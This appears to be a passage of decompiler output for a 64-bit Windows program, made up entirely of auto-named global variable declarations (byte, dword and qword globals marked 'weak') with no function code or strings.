char byte_1400DA7D6; // weak
char byte_1400DA7D7; // weak
char byte_1400DA7D8; // weak
char byte_1400DA7D9; // weak
int dword_1400DA7DC; // weak
char byte_1400DA7E0[]; // weak
char byte_1400DA7E1; // weak
char byte_1400DA7E2; // weak
char byte_1400DA7E3; // weak
char byte_1400DA7E4; // weak
char byte_1400DA7E5; // weak
char byte_1400DA7E6; // weak
char byte_1400DA7E7; // weak
char byte_1400DA7E8; // weak
char byte_1400DA7E9; // weak
char byte_1400DA7EA; // weak
char byte_1400DA7EB; // weak
char byte_1400DA7EC; // weak
char byte_1400DA7ED; // weak
char byte_1400DA7EE; // weak
char byte_1400DA7EF; // weak
char byte_1400DA7F0; // weak
char byte_1400DA7F1; // weak
char byte_1400DA7F2; // weak
char byte_1400DA7F3; // weak
char byte_1400DA7F4; // weak
char byte_1400DA7F5; // weak
char byte_1400DA7F6; // weak
char byte_1400DA7F7; // weak
char byte_1400DA7F8; // weak
char byte_1400DA7F9; // weak
char byte_1400DA7FA; // weak
char byte_1400DA7FB; // weak
char byte_1400DA7FC; // weak
char byte_1400DA7FD; // weak
char byte_1400DA7FE; // weak
char byte_1400DA7FF; // weak
char byte_1400DA800; // weak
char byte_1400DA801; // weak
char byte_1400DA802; // weak
char byte_1400DA803; // weak
char byte_1400DA804; // weak
char byte_1400DA805; // weak
char byte_1400DA806; // weak
char byte_1400DA807; // weak
char byte_1400DA808; // weak
char byte_1400DA809; // weak
char byte_1400DA80A; // weak
char byte_1400DA80B; // weak
char byte_1400DA80C; // weak
char byte_1400DA80D; // weak
char byte_1400DA80E; // weak
char byte_1400DA80F; // weak
char byte_1400DA810; // weak
char byte_1400DA811; // weak
char byte_1400DA812; // weak
char byte_1400DA813; // weak
char byte_1400DA814; // weak
char byte_1400DA815; // weak
char byte_1400DA816; // weak
char byte_1400DA817; // weak
char byte_1400DA818; // weak
char byte_1400DA819; // weak
char byte_1400DA81A; // weak
char byte_1400DA81B; // weak
char byte_1400DA81C; // weak
char byte_1400DA81D; // weak
char byte_1400DA81E; // weak
char byte_1400DA81F; // weak
char byte_1400DA820; // weak
char byte_1400DA821; // weak
char byte_1400DA822; // weak
char byte_1400DA823; // weak
char byte_1400DA824; // weak
__int64 qword_1400DA828; // weak
__int64 qword_1400DA830; // weak
int dword_1400DA840; // weak
__int64 qword_1400DA848; // weak
int dword_1400DA864; // weak
int dword_1400DA868; // weak
int dword_1400DA86C; // weak
int dword_1400DA870; // weak
__int64 qword_1400DA880[]; // weak
__int64 (__fastcall *qword_1400DA8D0)(_QWORD, _QWORD); // weak
__int64 qword_1400DA920[]; // weak
__int64 qword_1400DA970[]; // weak
char byte_1400DA9B8; // weak
int dword_1400DA9BC; // weak
char byte_1400DA9C0[]; // weak
char byte_1400DA9C1; // weak
char byte_1400DA9C2; // weak
char byte_1400DA9C3; // weak
char byte_1400DA9C4; // weak
char byte_1400DA9C5; // weak
char byte_1400DA9C6; // weak
char byte_1400DA9C7; // weak
char byte_1400DA9C8; // weak
char byte_1400DA9C9; // weak
char byte_1400DA9CA; // weak
char byte_1400DA9CB; // weak
char byte_1400DA9CC; // weak
char byte_1400DA9CD; // weak
char byte_1400DA9CE; // weak
char byte_1400DA9CF; // weak
char byte_1400DA9D0; // weak
char byte_1400DA9D1; // weak
char byte_1400DA9D2; // weak
char byte_1400DA9D3; // weak
char byte_1400DA9D4; // weak
char byte_1400DA9D5; // weak
char byte_1400DA9D6; // weak
char byte_1400DA9D7; // weak
char byte_1400DA9D8; // weak
char byte_1400DA9D9; // weak
char byte_1400DA9DA; // weak
char byte_1400DA9DB; // weak
char byte_1400DA9DC; // weak
char byte_1400DA9DD; // weak
char byte_1400DA9DE; // weak
char byte_1400DA9DF; // weak
char byte_1400DA9E0; // weak
char byte_1400DA9E1; // weak
char byte_1400DA9E2; // weak
char byte_1400DA9E3; // weak
char byte_1400DA9E4; // weak
char byte_1400DA9E5; // weak
char byte_1400DA9E6; // weak
char byte_1400DA9E7; // weak
char byte_1400DA9E8; // weak
char byte_1400DA9E9; // weak
char byte_1400DA9EA; // weak
char byte_1400DA9EB; // weak
char byte_1400DA9EC; // weak
char byte_1400DA9ED; // weak
char byte_1400DA9EE; // weak
char byte_1400DA9EF; // weak
char byte_1400DA9F0; // weak
char byte_1400DA9F1; // weak
char byte_1400DA9F2; // weak
char byte_1400DA9F3; // weak
char byte_1400DA9F4; // weak
char byte_1400DA9F5; // weak
char byte_1400DA9F6; // weak
char byte_1400DA9F7; // weak
int dword_1400DA9F8; // weak
char byte_1400DA9FC[]; // weak
char byte_1400DA9FD; // weak
char byte_1400DA9FE; // weak
char byte_1400DA9FF; // weak
char byte_1400DAA00; // weak
__int64 qword_1400DAA08; // weak
__int64 qword_1400DAA18; // weak
__int64 qword_1400DAA28; // weak
int dword_1400DAA38; // weak
int dword_1400DAA3C; // weak
int dword_1400DAA40; // weak
int dword_1400DAA44; // weak
char byte_1400DAA48; // weak
int dword_1400DAA4C; // weak
char byte_1400DAA50[]; // weak
char byte_1400DAA51; // weak
char byte_1400DAA52; // weak
char byte_1400DAA53; // weak
char byte_1400DAA54; // weak
char byte_1400DAA55; // weak
char byte_1400DAA56; // weak
char byte_1400DAA57; // weak
char byte_1400DAA58; // weak
char byte_1400DAA59; // weak
char byte_1400DAA5A; // weak
char byte_1400DAA5B; // weak
char byte_1400DAA5C; // weak
char byte_1400DAA5D; // weak
char byte_1400DAA5E; // weak
char byte_1400DAA5F; // weak
char byte_1400DAA60; // weak
char byte_1400DAA61; // weak
char byte_1400DAA62; // weak
char byte_1400DAA63; // weak
char byte_1400DAA64; // weak
char byte_1400DAA65; // weak
char byte_1400DAA66; // weak
char byte_1400DAA67; // weak
char byte_1400DAA68; // weak
char byte_1400DAA69; // weak
char byte_1400DAA6A; // weak
char byte_1400DAA6B; // weak
char byte_1400DAA6C; // weak
char byte_1400DAA6D; // weak
char byte_1400DAA6E; // weak
char byte_1400DAA6F; // weak
char byte_1400DAA70; // weak
char byte_1400DAA71; // weak
char byte_1400DAA72; // weak
char byte_1400DAA73; // weak
char byte_1400DAA74; // weak
char byte_1400DAA75; // weak
char byte_1400DAA76; // weak
char byte_1400DAA77; // weak
char byte_1400DAA78; // weak
char byte_1400DAA79; // weak
char byte_1400DAA7A; // weak
char byte_1400DAA7B; // weak
char byte_1400DAA7C; // weak
char byte_1400DAA7D; // weak
char byte_1400DAA7E; // weak
char byte_1400DAA7F; // weak
char byte_1400DAA80; // weak
char byte_1400DAA81; // weak
char byte_1400DAA82; // weak
char byte_1400DAA83; // weak
char byte_1400DAA84; // weak
char byte_1400DAA85; // weak
char byte_1400DAA86; // weak
char byte_1400DAA87; // weak
int dword_1400DAA88; // weak
char byte_1400DAA90[]; // weak
char byte_1400DAA91; // weak
char byte_1400DAA92; // weak
char byte_1400DAA93; // weak
char byte_1400DAA94; // weak
char byte_1400DAA95; // weak
char byte_1400DAA96; // weak
char byte_1400DAA97; // weak
char byte_1400DAA98; // weak
char byte_1400DAA99; // weak
char byte_1400DAA9A; // weak
char byte_1400DAA9B; // weak
char byte_1400DAA9C; // weak
char byte_1400DAA9D; // weak
char byte_1400DAA9E; // weak
char byte_1400DAA9F; // weak
char byte_1400DAAA0; // weak
char byte_1400DAAA1; // weak
char byte_1400DAAA2; // weak
char byte_1400DAAA3; // weak
char byte_1400DAAA4; // weak
char byte_1400DAAA5; // weak
char byte_1400DAAA6; // weak
char byte_1400DAAA7; // weak
char byte_1400DAAA8; // weak
char byte_1400DAAA9; // weak
char byte_1400DAAAA; // weak
char byte_1400DAAAB; // weak
char byte_1400DAAAC; // weak
char byte_1400DAAAD; // weak
char byte_1400DAAAE; // weak
char byte_1400DAAAF; // weak
char byte_1400DAAB0; // weak
char byte_1400DAAB1; // weak
char byte_1400DAAB2; // weak
char byte_1400DAAB3; // weak
char byte_1400DAAB4; // weak
char byte_1400DAAB5; // weak
char byte_1400DAAB6; // weak
char byte_1400DAAB7; // weak
char byte_1400DAAB8; // weak
char byte_1400DAAB9; // weak
char byte_1400DAABA; // weak
char byte_1400DAABB; // weak
char byte_1400DAABC; // weak
char byte_1400DAABD; // weak
char byte_1400DAABE; // weak
char byte_1400DAABF; // weak
char byte_1400DAAC0; // weak
char byte_1400DAAC1; // weak
char byte_1400DAAC2; // weak
char byte_1400DAAC3; // weak
char byte_1400DAAC4; // weak
char byte_1400DAAC5; // weak
char byte_1400DAAC6; // weak
char byte_1400DAAC7; // weak
char byte_1400DAAC8; // weak
char byte_1400DAAC9; // weak
char byte_1400DAACA; // weak
char byte_1400DAACB; // weak
char byte_1400DAACC; // weak
char byte_1400DAACD; // weak
char byte_1400DAACE; // weak
char byte_1400DAACF; // weak
char byte_1400DAAD0; // weak
char byte_1400DAAD1; // weak
char byte_1400DAAD2; // weak
char byte_1400DAAD3; // weak
char byte_1400DAAD4; // weak
char byte_1400DAAD5; // weak
char byte_1400DAAD6; // weak
int dword_1400DAAD8; // weak
char byte_1400DAAE0[]; // weak
char byte_1400DAAE1; // weak
char byte_1400DAAE2; // weak
char byte_1400DAAE3; // weak
char byte_1400DAAE4; // weak
char byte_1400DAAE5; // weak
char byte_1400DAAE6; // weak
char byte_1400DAAE7; // weak
char byte_1400DAAE8; // weak
char byte_1400DAAE9; // weak
char byte_1400DAAEA; // weak
char byte_1400DAAEB; // weak
char byte_1400DAAEC; // weak
char byte_1400DAAED; // weak
char byte_1400DAAEE; // weak
char byte_1400DAAEF; // weak
char byte_1400DAAF0; // weak
char byte_1400DAAF1; // weak
char byte_1400DAAF2; // weak
char byte_1400DAAF3; // weak
char byte_1400DAAF4; // weak
char byte_1400DAAF5; // weak
char byte_1400DAAF6; // weak
char byte_1400DAAF7; // weak
char byte_1400DAAF8; // weak
char byte_1400DAAF9; // weak
char byte_1400DAAFA; // weak
char byte_1400DAAFB; // weak
char byte_1400DAAFC; // weak
char byte_1400DAAFD; // weak
char byte_1400DAAFE; // weak
char byte_1400DAAFF; // weak
char byte_1400DAB00; // weak
char byte_1400DAB01; // weak
char byte_1400DAB02; // weak
char byte_1400DAB03; // weak
char byte_1400DAB04; // weak
char byte_1400DAB05; // weak
char byte_1400DAB06; // weak
char byte_1400DAB07; // weak
char byte_1400DAB08; // weak
char byte_1400DAB09; // weak
char byte_1400DAB0A; // weak
char byte_1400DAB0B; // weak
char byte_1400DAB0C; // weak
char byte_1400DAB0D; // weak
char byte_1400DAB0E; // weak
char byte_1400DAB0F; // weak
char byte_1400DAB10; // weak
char byte_1400DAB11; // weak
char byte_1400DAB12; // weak
char byte_1400DAB13; // weak
char byte_1400DAB14; // weak
char byte_1400DAB15; // weak
char byte_1400DAB16; // weak
char byte_1400DAB17; // weak
char byte_1400DAB18; // weak
char byte_1400DAB19; // weak
char byte_1400DAB1A; // weak
char byte_1400DAB1B; // weak
char byte_1400DAB1C; // weak
char byte_1400DAB1D; // weak
char byte_1400DAB1E; // weak
char byte_1400DAB1F; // weak
char byte_1400DAB20; // weak
char byte_1400DAB21; // weak
char byte_1400DAB22; // weak
char byte_1400DAB23; // weak
char byte_1400DAB24; // weak
char byte_1400DAB25; // weak
char byte_1400DAB26; // weak
char byte_1400DAB27; // weak
char byte_1400DAB28; // weak
char byte_1400DAB29; // weak
char byte_1400DAB2A; // weak
char byte_1400DAB2B; // weak
char byte_1400DAB2C; // weak
char byte_1400DAB2D; // weak
char byte_1400DAB2E; // weak
char byte_1400DAB2F; // weak
char byte_1400DAB30; // weak
char byte_1400DAB31; // weak
int dword_1400DAB34; // weak
char byte_1400DAB38[]; // weak
char byte_1400DAB39; // weak
char byte_1400DAB3A; // weak
char byte_1400DAB3B; // weak
char byte_1400DAB3C; // weak
char byte_1400DAB3D; // weak
char byte_1400DAB3E; // weak
__int64 (__fastcall *qword_1400DAB40)(_QWORD, _QWORD, _QWORD); // weak
int dword_1400DAB4C; // weak
int dword_1400DAB58; // weak
int dword_1400DAB5C; // weak
int dword_1400DAB60; // weak
int dword_1400DAB64; // weak
int dword_1400DAB6C; // weak
int dword_1400DAB70; // weak
int dword_1400DAB74; // weak
int dword_1400DAB78; // weak
void *qword_1400DAB80; // idb
int dword_1400DAB90; // weak
int dword_1400DAB94; // weak
int dword_1400DAB98; // weak
int dword_1400DAB9C; // weak
char byte_1400DABA0; // weak
int dword_1400DABA4; // weak
char byte_1400DABA8[]; // weak
char byte_1400DABA9; // weak
char byte_1400DABAA; // weak
char byte_1400DABAB; // weak
char byte_1400DABAC; // weak
char byte_1400DABAD; // weak
char byte_1400DABAE; // weak
char byte_1400DABAF; // weak
char byte_1400DABB0; // weak
char byte_1400DABB1; // weak
char byte_1400DABB2; // weak
char byte_1400DABB3; // weak
char byte_1400DABB4; // weak
char byte_1400DABB5; // weak
char byte_1400DABB6; // weak
char byte_1400DABB7; // weak
char byte_1400DABB8; // weak
char byte_1400DABB9; // weak
char byte_1400DABBA; // weak
char byte_1400DABBB; // weak
char byte_1400DABBC; // weak
char byte_1400DABBD; // weak
char byte_1400DABBE; // weak
char byte_1400DABBF; // weak
char byte_1400DABC0; // weak
char byte_1400DABC1; // weak
char byte_1400DABC2; // weak
char byte_1400DABC3; // weak
char byte_1400DABC4; // weak
char byte_1400DABC5; // weak
char byte_1400DABC6; // weak
int dword_1400DABCC; // weak
int dword_1400DABD0; // weak
int dword_1400DABD4; // weak
int dword_1400DABD8; // weak
int dword_1400DABE0; // weak
int dword_1400DABE4; // weak
int dword_1400DABE8; // weak
int dword_1400DABEC; // weak
void *qword_1400DABF8; // idb
__int64 qword_1400DAC08; // weak
int dword_1400DAC18; // weak
int dword_1400DAC1C; // weak
int dword_1400DAC20; // weak
int dword_1400DAC24; // weak
int dword_1400DAC2C; // weak
int dword_1400DAC30; // weak
int dword_1400DAC34; // weak
int dword_1400DAC38; // weak
int dword_1400DAC40; // weak
int dword_1400DAC44; // weak
int dword_1400DAC48; // weak
int dword_1400DAC4C; // weak
int dword_1400DAC54; // weak
int dword_1400DAC58; // weak
int dword_1400DAC5C; // weak
int dword_1400DAC60; // weak
__int64 qword_1400DAC68[]; // weak
_UNKNOWN unk_1400DAC70; // weak
__int64 qword_1400DB470; // weak
__int64 qword_1400DB478; // weak
char byte_1400DB480; // weak
char byte_1400DB481; // weak
int dword_1400DB488; // weak
int dword_1400DB48C; // weak
int dword_1400DB490; // weak
int dword_1400DB494; // weak
__int64 qword_1400DB498[]; // weak
_UNKNOWN unk_1400DB4A0; // weak
int dword_1400DB4A1[]; // weak
int dword_1400DBC98; // weak
int dword_1400DBCA4; // weak
int dword_1400DBCA8; // weak
int dword_1400DBCAC; // weak
int dword_1400DBCB0; // weak
int dword_1400DBCB8; // weak
int dword_1400DBCBC; // weak
int dword_1400DBCC0; // weak
int dword_1400DBCC4; // weak
int dword_1400DBCCC; // weak
int dword_1400DBCD0; // weak
int dword_1400DBCD4; // weak
int dword_1400DBCD8; // weak
int dword_1400DBCE0; // weak
int dword_1400DBCE4; // weak
int dword_1400DBCE8; // weak
int dword_1400DBCEC; // weak
int dword_1400DBCF4; // weak
int dword_1400DBCF8; // weak
int dword_1400DBCFC; // weak
int dword_1400DBD00; // weak
int dword_1400DBD08; // weak
int dword_1400DBD0C; // weak
int dword_1400DBD10; // weak
int dword_1400DBD14; // weak
int dword_1400DBD1C; // weak
int dword_1400DBD20; // weak
int dword_1400DBD24; // weak
int dword_1400DBD28; // weak
LARGE_INTEGER Frequency; // idb
int dword_1400DBD3C; // weak
int dword_1400DBD40; // weak
int dword_1400DBD44; // weak
int dword_1400DBD48; // weak
char byte_1400DBD4C; // weak
char byte_1400DBD4D; // weak
char byte_1400DBD4E; // weak
char byte_1400DBD4F; // weak
char byte_1400DBD50; // weak
char byte_1400DBD51; // weak
char byte_1400DBD52; // weak
char byte_1400DBD53; // weak
char byte_1400DBD54; // weak
char byte_1400DBD55; // weak
int dword_1400DBD60; // weak
int dword_1400DBD64; // weak
int dword_1400DBD68; // weak
int dword_1400DBD6C; // weak
__int64 qword_1400DBD78; // weak
_UNKNOWN unk_1400DBD80; // weak
int dword_1400DBD88; // weak
int dword_1400DBD98; // weak
int dword_1400DBDAC; // weak
int dword_1400DBDB0; // weak
int dword_1400DBDB4; // weak
int dword_1400DBDB8; // weak
int dword_1400DBDC8; // weak
int dword_1400DBDCC; // weak
int dword_1400DBDD0; // weak
int dword_1400DBDD4; // weak
int dword_1400DBDEC; // weak
int dword_1400DBDF0; // weak
int dword_1400DBDF4; // weak
int dword_1400DBDFC; // weak
char byte_1400DBE00; // weak
int dword_1400DBE04; // weak
char byte_1400DBE08[]; // weak
char byte_1400DBE09; // weak
char byte_1400DBE0A; // weak
char byte_1400DBE0B; // weak
char byte_1400DBE0C; // weak
char byte_1400DBE0D; // weak
char byte_1400DBE0E; // weak
char byte_1400DBE0F; // weak
int dword_1400DBE10; // weak
char byte_1400DBE18[]; // weak
char byte_1400DBE19; // weak
char byte_1400DBE1A; // weak
char byte_1400DBE1B; // weak
char byte_1400DBE1C; // weak
char byte_1400DBE1D; // weak
char byte_1400DBE1E; // weak
char byte_1400DBE1F; // weak
char byte_1400DBE20; // weak
_UNKNOWN unk_1400DBE31; // weak
int dword_1400DBE34; // weak
int dword_1400DBE38; // weak
int dword_1400DBE3C; // weak
int dword_1400DBE40; // weak
char byte_1400DBE44; // weak
int dword_1400DBE48; // weak
char byte_1400DBE4C[]; // weak
char byte_1400DBE4D; // weak
char byte_1400DBE4E; // weak
char byte_1400DBE4F; // weak
char byte_1400DBE50; // weak
char byte_1400DBE51; // weak
char byte_1400DBE52; // weak
char byte_1400DBE53; // weak
int dword_1400DBE54; // weak
char byte_1400DBE58[]; // weak
char byte_1400DBE59; // weak
char byte_1400DBE5A; // weak
char byte_1400DBE5B; // weak
char byte_1400DBE5C; // weak
char byte_1400DBE5D; // weak
char byte_1400DBE5E; // weak
char byte_1400DBE5F; // weak
char byte_1400DBE60; // weak
int dword_1400DBE68; // weak
int dword_1400DBE6C; // weak
int dword_1400DBE70; // weak
int dword_1400DBE74; // weak
char byte_1400DBE78; // weak
int dword_1400DBE7C; // weak
char byte_1400DBE80[]; // weak
char byte_1400DBE81; // weak
char byte_1400DBE82; // weak
char byte_1400DBE83; // weak
char byte_1400DBE84; // weak
char byte_1400DBE85; // weak
char byte_1400DBE86; // weak
char byte_1400DBE87; // weak
char byte_1400DBE88; // weak
char byte_1400DBE89; // weak
char byte_1400DBE8A; // weak
char byte_1400DBE8B; // weak
char byte_1400DBE8C; // weak
char byte_1400DBE8D; // weak
char byte_1400DBE8E; // weak
char byte_1400DBE90[]; // weak
char byte_1400DBEA0; // weak
int dword_1400DBEA8; // weak
__int64 qword_1400DBEB0; // weak
int dword_1400DBEB8; // weak
int dword_1400DBEC4; // weak
int dword_1400DBEC8; // weak
int dword_1400DBECC; // weak
int dword_1400DBED0; // weak
char byte_1400DBED4; // weak
int dword_1400DBED8; // weak
char byte_1400DBEDC[]; // weak
char byte_1400DBEDD; // weak
char byte_1400DBEDE; // weak
char byte_1400DBEDF; // weak
char byte_1400DBEE0; // weak
char byte_1400DBEE1; // weak
char byte_1400DBEE2; // weak
char byte_1400DBEE3; // weak
int dword_1400DBEE4; // weak
char byte_1400DBEE8[]; // weak
char byte_1400DBEE9; // weak
char byte_1400DBEEA; // weak
char byte_1400DBEEB; // weak
char byte_1400DBEEC; // weak
char byte_1400DBEED; // weak
void *qword_1400DBEF0; // idb
__int64 qword_1400DBF00; // weak
__int64 qword_1400DBF08; // weak
int dword_1400DBF18; // weak
int dword_1400DBF1C; // weak
int dword_1400DBF20; // weak
int dword_1400DBF24; // weak
char byte_1400DBF28; // weak
int dword_1400DBF2C; // weak
char byte_1400DBF30[]; // weak
char byte_1400DBF31; // weak
char byte_1400DBF32; // weak
char byte_1400DBF33; // weak
char byte_1400DBF34; // weak
char byte_1400DBF35; // weak
char byte_1400DBF36; // weak
char byte_1400DBF37; // weak
char byte_1400DBF38; // weak
int dword_1400DBF3C; // weak
char byte_1400DBF40[]; // weak
char byte_1400DBF41; // weak
char byte_1400DBF42; // weak
int dword_1400DBF4C; // weak
int dword_1400DBF50; // weak
int dword_1400DBF54; // weak
int dword_1400DBF58; // weak
char byte_1400DBF5C; // weak
int dword_1400DBF60; // weak
char byte_1400DBF64[]; // weak
char byte_1400DBF65; // weak
char byte_1400DBF66; // weak
char byte_1400DBF67; // weak
char byte_1400DBF68; // weak
char byte_1400DBF6C[6]; // idb
char byte_1400DBF72; // weak
int dword_1400DBF74; // weak
char byte_1400DBF78[]; // weak
char byte_1400DBF79; // weak
char byte_1400DBF7A; // weak
char byte_1400DBF7B; // weak
char byte_1400DBF7C; // weak
char byte_1400DBF7D; // weak
char byte_1400DBF7E; // weak
char byte_1400DBF7F; // weak
char byte_1400DBF80; // weak
char byte_1400DBF81; // weak
char byte_1400DBF82; // weak
char byte_1400DBF83; // weak
char byte_1400DBF84; // weak
char byte_1400DBF85; // weak
char byte_1400DBF86; // weak
char byte_1400DBF88[16]; // idb
char byte_1400DBF98; // weak
int dword_1400DBF9C; // weak
char byte_1400DBFA0[]; // weak
char byte_1400DBFA1; // weak
char byte_1400DBFA2; // weak
char byte_1400DBFA3; // weak
char byte_1400DBFA4; // weak
char byte_1400DBFA5; // weak
char byte_1400DBFA6; // weak
char byte_1400DBFA7; // weak
char byte_1400DBFA8; // weak
char byte_1400DBFA9; // weak
char byte_1400DBFAA; // weak
char byte_1400DBFAB; // weak
char byte_1400DBFAC; // weak
int dword_1400DBFB0; // weak
char byte_1400DBFB8[]; // weak
char byte_1400DBFB9; // weak
char byte_1400DBFBA; // weak
char byte_1400DBFBB; // weak
char byte_1400DBFBC; // weak
char byte_1400DBFBD; // weak
char byte_1400DBFBE; // weak
char byte_1400DBFBF; // weak
char byte_1400DBFC0; // weak
char byte_1400DBFC1; // weak
char byte_1400DBFC2; // weak
char byte_1400DBFC3; // weak
char byte_1400DBFC4; // weak
char byte_1400DBFC5; // weak
char byte_1400DBFC6; // weak
char byte_1400DBFC7; // weak
char byte_1400DBFC8[17]; // idb
char byte_1400DBFD9; // weak
int dword_1400DBFDC; // weak
char byte_1400DBFE0[]; // weak
char byte_1400DBFE1; // weak
char byte_1400DBFE2; // weak
char byte_1400DBFE3; // weak
char byte_1400DBFE4; // weak
char byte_1400DBFE5; // weak
char byte_1400DBFE6; // weak
char byte_1400DBFE7; // weak
char byte_1400DBFE8; // weak
char byte_1400DBFE9; // weak
int dword_1400DBFEC; // weak
char byte_1400DBFF0[]; // weak
char byte_1400DBFF1; // weak
char byte_1400DBFF2; // weak
char byte_1400DBFF3; // weak
char byte_1400DBFF4; // weak
char byte_1400DBFF5; // weak
char byte_1400DBFF6; // weak
char byte_1400DBFF7; // weak
char byte_1400DBFF8; // weak
int dword_1400DC000; // weak
int dword_1400DC004; // weak
int dword_1400DC008; // weak
int dword_1400DC00C; // weak
char byte_1400DC010; // weak
int dword_1400DC014; // weak
char byte_1400DC018[]; // weak
char byte_1400DC019; // weak
char byte_1400DC01A; // weak
char byte_1400DC01B; // weak
char byte_1400DC01C; // weak
char byte_1400DC01D; // weak
char byte_1400DC01E; // weak
char byte_1400DC01F; // weak
char byte_1400DC020; // weak
char byte_1400DC021; // weak
char byte_1400DC022; // weak
char byte_1400DC023; // weak
char byte_1400DC024; // weak
char byte_1400DC025; // weak
char byte_1400DC026; // weak
char byte_1400DC027; // weak
char byte_1400DC028; // weak
char byte_1400DC029; // weak
char byte_1400DC02A; // weak
char byte_1400DC02B; // weak
char byte_1400DC02C; // weak
char byte_1400DC02D; // weak
char byte_1400DC02E; // weak
char byte_1400DC02F; // weak
char byte_1400DC030[25]; // idb
char byte_1400DC049; // weak
int dword_1400DC04C; // weak
char byte_1400DC050[]; // weak
char byte_1400DC051; // weak
char byte_1400DC052; // weak
char byte_1400DC053; // weak
char byte_1400DC054; // weak
char byte_1400DC055; // weak
char byte_1400DC056; // weak
char byte_1400DC057; // weak
char byte_1400DC058; // weak
char byte_1400DC059; // weak
char byte_1400DC05A; // weak
char byte_1400DC05B; // weak
char byte_1400DC05C; // weak
char byte_1400DC05D; // weak
char byte_1400DC05E; // weak
char byte_1400DC05F; // weak
char byte_1400DC060; // weak
char byte_1400DC061; // weak
char byte_1400DC062; // weak
char byte_1400DC063; // weak
char byte_1400DC064; // weak
char byte_1400DC065; // weak
char byte_1400DC066; // weak
char byte_1400DC067; // weak
char byte_1400DC068; // weak
char byte_1400DC069; // weak
char byte_1400DC070[32]; // idb
int dword_1400DC090; // weak
int dword_1400DC094; // weak
int dword_1400DC098; // weak
int dword_1400DC09C; // weak
char byte_1400DC0A0; // weak
int dword_1400DC0A4; // weak
char byte_1400DC0A8[]; // weak
char byte_1400DC0A9; // weak
char byte_1400DC0AA; // weak
char byte_1400DC0AB; // weak
char byte_1400DC0AC; // weak
char byte_1400DC0AD; // weak
char byte_1400DC0AE; // weak
char byte_1400DC0AF; // weak
char byte_1400DC0B0; // weak
char byte_1400DC0B1; // weak
char byte_1400DC0B2; // weak
char byte_1400DC0B3; // weak
char byte_1400DC0B4; // weak
char byte_1400DC0B8[20]; // idb
int dword_1400DC0CC; // weak
int dword_1400DC0D0; // weak
int dword_1400DC0D4; // weak
int dword_1400DC0D8; // weak
char byte_1400DC0DC; // weak
int dword_1400DC0E0; // weak
char byte_1400DC0E8[]; // weak
char byte_1400DC0E9; // weak
char byte_1400DC0EA; // weak
char byte_1400DC0EB; // weak
char byte_1400DC0EC; // weak
char byte_1400DC0ED; // weak
char byte_1400DC0EE; // weak
char byte_1400DC0EF; // weak
char byte_1400DC0F0; // weak
char byte_1400DC0F1; // weak
char byte_1400DC0F2; // weak
char byte_1400DC0F3; // weak
char byte_1400DC0F4; // weak
char byte_1400DC0F5; // weak
char byte_1400DC0F6; // weak
char byte_1400DC0F7; // weak
char byte_1400DC0F8; // weak
char byte_1400DC0F9; // weak
char byte_1400DC0FA; // weak
char byte_1400DC0FB; // weak
char byte_1400DC0FC; // weak
char byte_1400DC0FD; // weak
char byte_1400DC0FE; // weak
char byte_1400DC0FF; // weak
char byte_1400DC100; // weak
char byte_1400DC108[32]; // idb
int dword_1400DC128; // weak
int dword_1400DC12C; // weak
int dword_1400DC130; // weak
int dword_1400DC134; // weak
char byte_1400DC138; // weak
int dword_1400DC13C; // weak
char byte_1400DC140[]; // weak
char byte_1400DC141; // weak
char byte_1400DC142; // weak
char byte_1400DC143; // weak
char byte_1400DC144; // weak
char byte_1400DC145; // weak
char byte_1400DC146; // weak
char byte_1400DC147; // weak
char byte_1400DC148; // weak
char byte_1400DC149; // weak
char byte_1400DC14A; // weak
char byte_1400DC14B; // weak
char byte_1400DC14C; // weak
char byte_1400DC14D; // weak
char byte_1400DC14E; // weak
char byte_1400DC14F; // weak
char byte_1400DC150; // weak
char byte_1400DC151; // weak
char byte_1400DC152; // weak
char byte_1400DC153; // weak
char byte_1400DC154; // weak
char byte_1400DC155; // weak
char byte_1400DC156; // weak
char byte_1400DC157; // weak
char byte_1400DC158; // weak
char byte_1400DC160[]; // weak
int dword_1400DC180; // weak
int dword_1400DC184; // weak
int dword_1400DC188; // weak
int dword_1400DC18C; // weak
char byte_1400DC190; // weak
int dword_1400DC194; // weak
char byte_1400DC198[]; // weak
char byte_1400DC199; // weak
char byte_1400DC19A; // weak
char byte_1400DC19B; // weak
char byte_1400DC19C; // weak
char byte_1400DC19D; // weak
char byte_1400DC19E; // weak
char byte_1400DC19F; // weak
char byte_1400DC1A0; // weak
char byte_1400DC1A8[10]; // idb
char byte_1400DC1B2; // weak
int dword_1400DC1B4; // weak
char byte_1400DC1B8[]; // weak
char byte_1400DC1B9; // weak
char byte_1400DC1BA; // weak
char byte_1400DC1BB; // weak
char byte_1400DC1BC; // weak
char byte_1400DC1BD; // weak
char byte_1400DC1BE; // weak
char byte_1400DC1BF; // weak
char byte_1400DC1C0; // weak
char byte_1400DC1C1; // weak
char byte_1400DC1C2; // weak
char byte_1400DC1C3; // weak
char byte_1400DC1C4; // weak
char byte_1400DC1C5; // weak
char byte_1400DC1C6; // weak
char byte_1400DC1C7; // weak
char byte_1400DC1C8; // weak
char byte_1400DC1C9; // weak
char byte_1400DC1CA; // weak
char byte_1400DC1CB; // weak
char byte_1400DC1CC; // weak
char byte_1400DC1CD; // weak
char byte_1400DC1CE; // weak
char byte_1400DC1CF; // weak
char byte_1400DC1D0; // weak
char byte_1400DC1D8[32]; // idb
__int64 qword_1400DC1F8; // weak
int dword_1400DC204; // weak
int dword_1400DC208; // weak
int dword_1400DC20C; // weak
int dword_1400DC210; // weak
char byte_1400DC214; // weak
int dword_1400DC218; // weak
char byte_1400DC220[]; // weak
char byte_1400DC221; // weak
char byte_1400DC222; // weak
char byte_1400DC223; // weak
char byte_1400DC224; // weak
char byte_1400DC225; // weak
char byte_1400DC226; // weak
char byte_1400DC227; // weak
char byte_1400DC228; // weak
char byte_1400DC229; // weak
char byte_1400DC22A; // weak
char byte_1400DC22B; // weak
char byte_1400DC22C; // weak
int dword_1400DC230; // weak
char byte_1400DC238[]; // weak
char byte_1400DC239; // weak
char byte_1400DC23A; // weak
char byte_1400DC23B; // weak
char byte_1400DC23C; // weak
char byte_1400DC23D; // weak
char byte_1400DC23E; // weak
char byte_1400DC23F; // weak
char byte_1400DC240; // weak
char byte_1400DC241; // weak
char byte_1400DC242; // weak
char byte_1400DC243; // weak
char byte_1400DC244; // weak
int dword_1400DC24C; // weak
int dword_1400DC250; // weak
int dword_1400DC254; // weak
int dword_1400DC258; // weak
char byte_1400DC25D; // weak
int dword_1400DC260; // weak
char byte_1400DC264[]; // weak
char byte_1400DC265; // weak
char byte_1400DC266; // weak
char byte_1400DC267; // weak
char byte_1400DC268; // weak
int dword_1400DC26C; // weak
